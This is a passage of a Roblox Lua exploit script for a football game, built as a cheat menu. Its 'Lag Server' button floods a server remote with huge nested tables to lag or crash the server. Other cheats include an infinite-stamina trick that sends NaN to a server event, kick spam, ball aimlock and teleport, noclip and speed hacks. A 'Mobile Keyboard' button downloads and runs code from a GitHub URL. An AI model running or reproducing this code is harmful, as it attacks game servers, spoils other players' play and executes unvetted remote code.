local hb = game:GetService("RunService").Heartbeat
local tpwalking = true
local player = game:GetService("Players")
local lplr = player.LocalPlayer
local chr = lplr.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
while tpwalking and hb:Wait() and chr and hum and hum.Parent do
  if hum.MoveDirection.Magnitude > 0 then
    if tspeed and isNumber(tspeed) then
      chr:TranslateBy(hum.MoveDirection * tonumber(tspeed))
    else
      chr:TranslateBy(hum.MoveDirection)
    end
  end
end
end)
Section:NewButton("Lag Server (Press L On/Off)", "Aimbot UI", function()
getgenv().KeyBind="L"
getgenv().Delay=0.7
local UIS=game:GetService'UserInputService'

--//main

local function Source()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) 
   local mainvalueifonetable = 49999
   if type(val) ~= "number" then
       return nil 
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval 
end

local function bomb(tableincrease, tries) 
 local maintable = {}
 local spammedtable = {}
 
 table.insert(spammedtable, {})
 z = spammedtable[1]
 
 for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
 end 
 
 local calculatemax = getmaxvalue(tableincrease) 
 local maximum 
 
 if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
 
  if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 

 for i = 1, tries do
    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
 end
end


bomb(250, 5) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
        if getgenv().Toggled then
            getgenv().Toggled=false
            warn'Disabled!'
        elseif not getgenv().Toggled then
            getgenv().Toggled=true
            warn'Enabled!'
            while getgenv().Toggled do
                Source()
                wait(getgenv().Delay)
            end
        end
    end
end)
end)

Section:NewButton("Aimbot", "Aimbot UI", function()
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create a frame to hold the draggable UI elements
local DraggableFrame = Instance.new("Frame")
DraggableFrame.Parent = ScreenGui
DraggableFrame.Size = UDim2.new(0, 300, 0, 200)
DraggableFrame.Position = UDim2.new(0.5, -150, 0.5, -100) -- Centered
DraggableFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Initial color (red)
DraggableFrame.BorderSizePixel = 0
DraggableFrame.Draggable = true
DraggableFrame.Active = true

-- Rainbow effect for the background
task.spawn(function()
    local hue = 0
    while true do
        hue = (hue + 1) % 360
        DraggableFrame.BackgroundColor3 = Color3.fromHSV(hue / 360, 1, 1)
        task.wait(0.05) -- Adjust for smoother or faster color changes
    end
end)

-- Create the Shoot button
local ShootButton = Instance.new("TextButton")
ShootButton.Parent = DraggableFrame
ShootButton.Text = "Shoot Down Fast"
ShootButton.Size = UDim2.new(0, 150, 0, 50)
ShootButton.Position = UDim2.new(0.5, -75, 0, 10) -- Positioned inside DraggableFrame
ShootButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255) -- Blue
ShootButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
ShootButton.Font = Enum.Font.FredokaOne -- Updated font
ShootButton.TextSize = 20

-- Create a TextBox for custom shot speed input
local SpeedTextBox = Instance.new("TextBox")
SpeedTextBox.Parent = DraggableFrame
SpeedTextBox.Size = UDim2.new(0, 200, 0, 40)
SpeedTextBox.Position = UDim2.new(0.5, -100, 0.6, 0) -- Below the button
SpeedTextBox.Text = "300" -- Default value
SpeedTextBox.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
SpeedTextBox.BackgroundColor3 = Color3.fromRGB(173, 216, 230) -- Light blue
SpeedTextBox.BorderSizePixel = 0
SpeedTextBox.Font = Enum.Font.FredokaOne -- Updated font
SpeedTextBox.PlaceholderText = "Enter Speed (e.g., 300)"
SpeedTextBox.TextSize = 20

-- Create a label for showing the shot speed
local SpeedLabel = Instance.new("TextLabel")
SpeedLabel.Parent = DraggableFrame
SpeedLabel.Size = UDim2.new(0, 200, 0, 50)
SpeedLabel.Position = UDim2.new(0.5, -100, 0.7, 0) -- Below the textbox
SpeedLabel.Text = "Shot Speed: " .. SpeedTextBox.Text
SpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 0) -- Yellow
SpeedLabel.BackgroundTransparency = 1
SpeedLabel.Font = Enum.Font.FredokaOne -- Updated font
SpeedLabel.TextSize = 20

-- Update the shot speed label whenever the text changes
SpeedTextBox.FocusLost:Connect(function()
    local inputValue = tonumber(SpeedTextBox.Text)
    if inputValue then
        SpeedLabel.Text = "Shot Speed: " .. inputValue
    else
        SpeedLabel.Text = "Invalid Speed"
    end
end)

-- Define the shooting functionality
local function shootFastDown()
    local downwardDirection = Vector3.new(0, -50, -100) -- Aim downward and forward
    local shotPower = tonumber(SpeedTextBox.Text) or 300 -- Default to 300 if input is invalid

    local args = {
        [1] = shotPower, -- Shot power
        [4] = downwardDirection -- Target direction (downward)
    }

    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("BallService"):WaitForChild("RE"):WaitForChild("Shoot"):FireServer(unpack(args))
    
    print("Ball shot downward with speed: " .. shotPower)
end

-- Connect the button to the function
ShootButton.MouseButton1Click:Connect(shootFastDown)

-- Add drag functionality for mobile/PC
local dragging, dragInput, dragStart, startPos

-- Function to start dragging
DraggableFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = DraggableFrame.Position
    end
end)

-- Function to drag the frame
DraggableFrame.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        DraggableFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Function to stop dragging
DraggableFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

end)
Section:NewToggle("Inf Tackles/Slides", "Inf Slides", function(Value)
 a = Value
        while a do task.wait()
        pcall(function()
game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("BallService"):WaitForChild("RE"):WaitForChild("Slide"):FireServer()


end)
end
end)

-- Assuming this script is part of a larger GUI system where Section is available
local football
local toggle = false

local function updateFootballReference()
    football = workspace:FindFirstChild("Football")
    if not football then
        warn("Football not found in Workspace!")
    end
end

-- Update the Football reference at the start and when necessary
updateFootballReference()

-- Detect new footballs when they are added to the workspace
game:GetService("Workspace").ChildAdded:Connect(function(child)
    if child.Name == "Football" then
        updateFootballReference()
    end
end)

-- Toggle the Aimlock
Section:NewToggle("Aimlock Ball", "Aimlock", function(Value)
    toggle = Value
end)

-- Continuously update the player's aim towards the football if Aimlock is enabled
game:GetService("RunService").RenderStepped:Connect(function()
    if toggle and football and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local characterPosition = player.Character.HumanoidRootPart.Position
        local footballPosition = football.Position

        -- Set the camera or aim to face the football (example using CFrame)
        player.Character.HumanoidRootPart.CFrame = CFrame.lookAt(characterPosition, footballPosition)
    end
end)

Section:NewToggle("Bring Ball (Get Your Ball After Shooting)", "Auto Scores On Goal 1", function(value)
-- Create a ScreenGui and GUI elements in the Player's PlayerGui
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FootballToggleGui"
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Parent = screenGui
mainFrame.BackgroundColor3 = Color3.new(0.58, 0.9, 1) -- Light blue
mainFrame.BorderSizePixel = 5
mainFrame.Position = UDim2.new(0.35, 0, 0.4, 0)
mainFrame.Size = UDim2.new(0, 300, 0, 200) -- Resized to fit toggle button
mainFrame.Active = true
mainFrame.Draggable = true

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Parent = mainFrame
titleLabel.BackgroundColor3 = Color3.new(1, 0, 0) -- Red
titleLabel.BorderSizePixel = 5
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "Bring Ball Blue Locks: Rivals"
titleLabel.TextColor3 = Color3.new(1, 1, 1) -- White text
titleLabel.TextSize = 16

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0.8, 0, 0, 50) -- Width: 80% of Frame, Height: 50px
toggleButton.Position = UDim2.new(0.1, 0, 0.4, 0) -- Centered horizontally within frame
toggleButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.8) -- Blue color
toggleButton.TextColor3 = Color3.new(1, 1, 1) -- White text
toggleButton.Text = "Enable"
toggleButton.Parent = mainFrame

local toggle = false
toggleButton.MouseButton1Click:Connect(function()
    toggle = not toggle
    toggleButton.Text = toggle and "Disable" or "Enable"
end)

local football = workspace:WaitForChild("Football")

-- Keep the football's position updated if toggle is enabled
game:GetService("RunService").RenderStepped:Connect(function()
    if toggle and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        football.Position = player.Character.HumanoidRootPart.Position
    end
end)

end)

Section:NewButton("Inf Stamina (WORKS)", "Inf Stam", function()
local args = {
    [1] = 0/0
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("StaminaService"):WaitForChild("RE"):WaitForChild("DecreaseStamina"):FireServer(unpack(args))

end)




Section:NewSlider("Ball Size", "Ball Size", 15, 10, function(s)
for i,v in pairs(workspace:GetDescendants()) do
                   if v.Name == "Football" then 
 v.Size = Vector3.new((s),(s),(s)) 
end
end
end)



local kickPower = 120 -- Default kick power
local autoKickEnabled = false -- Variable to track toggle state

Section:NewToggle("Auto Kick Fast", "Auto Kick Fast", function(Value)
    autoKickEnabled = Value
    if autoKickEnabled then
        task.spawn(function() -- Spawn a new thread for the kicking logic
            while autoKickEnabled do
                task.wait(0.4) -- Fixed wait time for kicks
                pcall(function()
                    local args = {
                        [1] = kickPower, -- Use the slider-controlled value for kick power
                        [4] = Vector3.new(0.8475030064582825, -0.43559157848358154, -0.3033126890659332)
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("BallService"):WaitForChild("RE"):WaitForChild("Shoot"):FireServer(unpack(args))
                end)
            end
        end)
    end
end)

Section:NewSlider("Kick Power", "Power for Kick Fast", 700, 50, function(s)
    kickPower = s -- Update the kick power based on slider value
end)



Section:NewToggle("Auto Enable Flow", "Flow", function(Value)
 a = Value
        while a do task.wait()
        pcall(function()
game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FlowService"):WaitForChild("RE"):WaitForChild("Activate"):FireServer()
end)
end
end)

Section22:NewToggle("CFrame Speed", "CFrame Speed Toggle", function(Value)
    getgenv().CFrameSpeedEnabled = Value  -- This stores the toggle state (true/false)
    if CFrameSpeedEnabled then
        startCFrameSpeed() -- Starts moving when the toggle is enabled
    else
        stopCFrameSpeed() -- Stops moving when the toggle is disabled
    end
end)

repeat
    wait()
until game:IsLoaded()

local Players = game:service('Players')
local LocalPlayer = Players.LocalPlayer
repeat
    wait()
until LocalPlayer.Character

local UserInputService = game:service('UserInputService')
local RunService = game:service('RunService')

getgenv().Multiplier = 0.5
local movementConnection = nil  -- Used to store the movement loop connection

-- Function to start CFrame movement
function startCFrameSpeed()
    if movementConnection == nil then
        movementConnection = RunService.Stepped:Connect(function()
            LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
        end)
    end
end

-- Function to stop CFrame movement
function stopCFrameSpeed()
    if movementConnection then
        movementConnection:Disconnect()
        movementConnection = nil
    end
end

-- Key bindings for increasing and decreasing speed multiplier
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftBracket then
        Multiplier = Multiplier + 0.01
        print(Multiplier)
        wait(0.2)
        while UserInputService:IsKeyDown(Enum.KeyCode.LeftBracket) do
            wait()
            Multiplier = Multiplier + 0.01
            print(Multiplier)
        end
    elseif input.KeyCode == Enum.KeyCode.RightBracket then
        Multiplier = Multiplier - 0.01
        print(Multiplier)
        wait(0.2)
        while UserInputService:IsKeyDown(Enum.KeyCode.RightBracket) do
            wait()
            Multiplier = Multiplier - 0.01
            print(Multiplier)
        end
    end
end)

-- Slider for adjusting speed multiplier
Section22:NewSlider("CFrame Speed", "Speed", 1, 0, function(s)
    getgenv().Multiplier = s
end)

Section22:NewButton("Boost FPS", "FPS Booster", function()
        for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part"
or v.ClassName == "SpawnLocation"
or v.ClassName == "WedgePart"
or v.ClassName == "Terrain"
or v.ClassName == "MeshPart" then
v.Material = "Plastic"
end
end
end)

Section22:NewToggle("Infinite Jump", "Infinite Jump", function(state)
if state then
_G.infinjump = true
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:connect(function(k)
if _G.infinjump then
if k:byte() == 32 then
Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
Humanoid:ChangeState("Jumping")
wait(0.1)
Humanoid:ChangeState("Seated")
end
end
end)
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
    else
if _G.infinjump == true then
_G.infinjump = false
else
_G.infinjump = true
end
end
            end)

Section22:NewToggle("Noclip", "Noclip", function()
 local Noclip = nil
local Clip = nil

function noclip()
	Clip = false
	local function Nocl()
		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
			for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
					v.CanCollide = false
				end
			end
		end
		wait(0.21) -- basic optimization
	end
	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
end

function clip()
	if Noclip then Noclip:Disconnect() end
	Clip = true
end

noclip()
end)


CredSection:NewLabel("Made By Legend HandlesYT")


CredSection:NewKeybind("Toggle UI", "Toggle The UI", Enum.KeyCode.L, function()
	Library:ToggleUI()
end)

CredSection:NewButton("Mobile Keyboard", "Mobile Players", function(state)
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)
wait(0.1)
local player = game.Players.LocalPlayer

local function createTutorialGui()
    -- Create the GUI
    local Turtorial = Instance.new("ScreenGui")
    local main = Instance.new("Frame")
    local JoinButton = Instance.new("TextButton")
    local UICorner_Join = Instance.new("UICorner")
    local shadow = Instance.new("Frame")

    Turtorial.Name = "Turtorial"
    Turtorial.Parent = player:WaitForChild("PlayerGui")
    Turtorial.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    main.Name = "main"
    main.Parent = Turtorial
    main.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    main.AnchorPoint = Vector2.new(0, 0)

    -- Function to position the GUI just below the top-left corner of the screen
    local function setPositionBelowTopLeft()
        local screenSize = game:GetService("Workspace").CurrentCamera.ViewportSize
        main.Position = UDim2.new(0, 10, 0, 10)  -- Just below the top-left with a slight offset
        main.Size = UDim2.new(0.15, 0, 0.10, 0)  -- Standard size for both devices
    end

    setPositionBelowTopLeft()

    main.Active = true
    main.Draggable = true

    -- Shadow effect for main frame
    shadow.Name = "shadow"
    shadow.Parent = main
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.6
    shadow.Position = UDim2.new(0, 5, 0, 5)
    shadow.Size = UDim2.new(1, 0, 1, 0)
    shadow.ZIndex = 0

    JoinButton.Name = "JoinButton"
    JoinButton.Parent = main
    JoinButton.BackgroundColor3 = Color3.fromRGB(40, 120, 255)

    -- Adjust button size based on device type
    if game:GetService("UserInputService").TouchEnabled then
        JoinButton.Size = UDim2.new(0.9, 0, 0.4, 0)
    else
        JoinButton.Size = UDim2.new(0.9, 0, 0.4, 0)
    end

    JoinButton.Position = UDim2.new(0.05, 0, 0.5, 0)
    JoinButton.Font = Enum.Font.Highway
    JoinButton.Text = "Toggle Gui"
    JoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    JoinButton.TextSize = 25
    JoinButton.TextStrokeTransparency = 0.7
    JoinButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

    UICorner_Join.CornerRadius = UDim.new(0.15, 0)
    UICorner_Join.Parent = JoinButton

    -- Toggle the visibility of ScreenGuis
    JoinButton.MouseButton1Down:Connect(function()
        local CoreGui = game:GetService("CoreGui")
        local function containsNumber(name)
            return name:match("%d") ~= nil
        end

        local function toggleScreenGuisWithNumbers()
            for _, gui in ipairs(CoreGui:GetChildren()) do
                if gui:IsA("ScreenGui") and containsNumber(gui.Name) and gui.Name ~= "Turtorial" then
                    gui.Enabled = not gui.Enabled
                    print((gui.Enabled and "Enabled" or "Disabled") .. " ScreenGui:", gui.Name)
                end
            end
        end

        toggleScreenGuisWithNumbers()

        CoreGui.ChildAdded:Connect(function(child)
            if child:IsA("ScreenGui") then
                task.wait(0.1)
                if containsNumber(child.Name) and child.Name ~= "Turtorial" then
                    child.Enabled = false
                    print("Disabled new ScreenGui:", child.Name)
                end
            end
        end)
    end)
end

-- Connect to CharacterAdded to ensure GUI is created again after respawn
player.CharacterAdded:Connect(function()
    -- Wait for the PlayerGui to load in case it's reset
    player:WaitForChild("PlayerGui")
    -- Create the GUI again after respawn
    createTutorialGui()
end)

-- Initial creation of the GUI when the player first joins
createTutorialGui()